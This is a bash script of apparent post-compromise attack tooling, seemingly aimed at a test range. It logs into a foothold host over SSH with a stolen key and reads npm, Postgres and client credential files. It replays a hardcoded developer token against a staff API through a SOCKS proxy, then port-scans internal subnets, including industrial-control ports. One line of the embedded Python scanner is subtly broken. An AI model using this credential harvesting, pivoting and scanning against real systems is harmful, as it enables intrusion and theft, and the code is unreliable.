#!/bin/bash
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
P="--socks5-hostname 127.0.0.1:1080"
C="curl -sS $P -k --max-time 15"
echo "===== support-client.json ====="
$S 'cat ~/.config/fieldlink/support-client.json 2>/dev/null; echo; cat ~/.npmrc 2>/dev/null; echo; cat ~/.pg_service.conf 2>/dev/null'
echo "===== staff directory auth attempts ====="
TOKD=fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo
for A in "-H Authorization:Bearer\ $TOKD" "-u rowan.ito:$TOKD" ""; do
  echo "--- auth [$A]"
  eval $C $A https://staff.keplerops.test/api/service-directory -w '\n%{http_code}\n' | head -c 3000
  echo
done
echo "===== scan 10.77.60.0/24 + 61/62 from rowan ====="
$S 'python3 - <<PYEOF
import socket, concurrent.futures as cf
ports=[22,80,443,1881,3000,3389,4000,4840,502,5432,8000,8001,8010,8080,8081,8082,8083,8088,8443,9000,9090,5000,5001,102,2404]
def chk(a):
    h,p=a
    s=socket.socket(); s.settimeout(1.2)
    try:
        if s.connect_ex((h,p))==0: return (h,p)
    except: pass
    finally: s.close()
res=[]
networks=[10.77.60,10.77.61,10.77.62]
jobs=[("%d.%d.%d.%d"%(n[0],n[1],n[2],i),p) for n in [(10,77,x) for x in (60,61,62)] for i in range(1,255) for p in ports]
with cf.ThreadPoolExecutor(max_workers=250) as ex:
    for r in ex.map(chk,jobs,chunksize=20):
        if r: res.append(r)
for h,p in sorted(res): print("%s:%s"%(h,p))
PYEOF'
